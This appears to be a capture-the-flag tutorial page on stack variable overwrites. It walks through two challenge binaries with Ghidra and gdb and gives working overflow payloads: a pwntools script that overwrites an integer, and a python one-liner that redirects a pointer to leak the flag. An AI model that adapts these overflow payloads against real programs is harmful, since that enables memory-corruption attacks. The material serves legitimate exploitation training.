# Variables

## Example 1 - Overwrite a variable

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Here we can see that according to Ghidra input is stored at offset `-0x38`. We can see that target is stored at offset `-0x24`. This means that there is a `0x14` byte difference between the two values.

```
read(0,&input,0x18);
```

Since we can write `0x18` bytes, that means we can fill up the `0x14` byte difference and overwrite four bytes (`0x18 - 0x14 = 4`) of `target`, and since integers are four bytes we can overwrite.

Taking a look at the memory layout in gdb gives us a better description. We set a breakpoint for directly after the `read` call and see what the memory looks like (read the address from ghidra):

```
b *0x4006a5
```

<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Here we can see that our input `15935728` is `0x14` bytes away. When we give the input `00000000000000000000` + p32(`0xcaf3baee`). We need the hex address to be in least endian (least significant byte first) because that is how the elf will read in data, so we have to pack it that way in order for the binary to read it properly:

```
python2 -c 'print "0"*0x14 + "\xee\xba\xf3\xca"' > input
```

{% hint style="warning" %}
\n is 4 bytes
{% endhint %}

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

With all of that, we can write an exploit for this challenge:

```
from pwn import *

# Establish the target process
target = process('./boi')

# Make the payload
payload = b"0" * 0x14 + p32(0xcaf3baee)

# Send the payload
target.send(payload)

# Drop to an interactive shell so we can interact with our shell
target.interactive()
```

## Example 2 - Overwrite a variable address

&#x20;We can see that with the fgets call, we can input 32 bytes worth of data into `input`. Let's see how many bytes `input` can hold:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main(undefined1 param_1)
             undefined         AL:1           <RETURN>                                XREF[1]:     0804861d(W)  
             undefined1        Stack[0x4]:1   param_1                                 XREF[1]:     080485bb(*)  
             FILE *            EAX:4          flagFile                                XREF[2]:     0804861d(W),
                                                                                                   08048655(W)  
             char              AL:1           local_EAX_154                           XREF[2]:     08048655(W),
                                                                                                   080486dd(W)  
             int               EAX:4          cmp                                     XREF[1]:     080486dd(W)  
             undefined4        Stack[0x0]:4   local_res0                              XREF[1]:     080485c2(R)  
             undefined4        Stack[-0xc]:4  local_c                                 XREF[1]:     08048704(R)  
             char *            Stack[-0x14]:4 target                                  XREF[2]:     0804860d(W),
                                                                                                   080486ee(W)  
             FILE *            Stack[-0x18]:4 flagHandle                              XREF[3]:     08048625(W),
                                                                                                   08048628(R),
                                                                                                   0804864b(R)  
             char[16]          Stack[-0x28]   vulnBuf                                 XREF[2]:     080486a6(*),
                                                                                                   080486d9(*)  
                             main                                            XREF[4]:     Entry Point(*),
                                                                                          _start:080484d7(*), 0804886c,
                                                                                          080488c8(*)  
        080485bb 8d 4c 24 04     LEA        ECX=>param_1,[ESP + 0x4]
```

So we can see that it can hold 16 bytes worth of data (0x28 - 0x18 = 16). So we effectively have a buffer overflow vulnerability with the fgets call to `input`. However it appears that we can't reach the `eip` register to get RCE. However we can reach `output_message` which is printed with a puts call, right before the function returns. So we can print whatever we want. That makes this code look really helpful:

```
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    perror("file open error.\n");
    exit(0);
  }
  if ( !fgets(flag, 48, stream) )
  {
    perror("file read error.\n");
    exit(0);
  }
```

So we can see here that after it opens the `flag.txt` file, it scans in 48 bytes worth of data into `flag`. This is interesting because if we can find the address of `flag`, then we should be able to overwrite the value of `output_message` with that address and then it should print out the contents of `flag`, which should be the flag.

```
  .bss:0804A080 ; char flag[48]
.bss:0804A080 flag            db 30h dup(?)           ; DATA XREF: main+95o
.bss:0804A080 _bss            ends
.bss:0804A080
```

So here we can see that `flag` lives in the bss, with the address `0x0804a080`. There are 20 bytes worth of data between `input` and `output_message` (0x28 - 0x14 = 20). So we can form a payload with 20 null bytes, followed by the address of `flag`:

```
  python -c 'print "\x00"*20 + "\x80\xa0\x04\x08"' | ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
Welcome my secret service. Do you know the password?
Input the password.
flag{gottem_boyz}
```
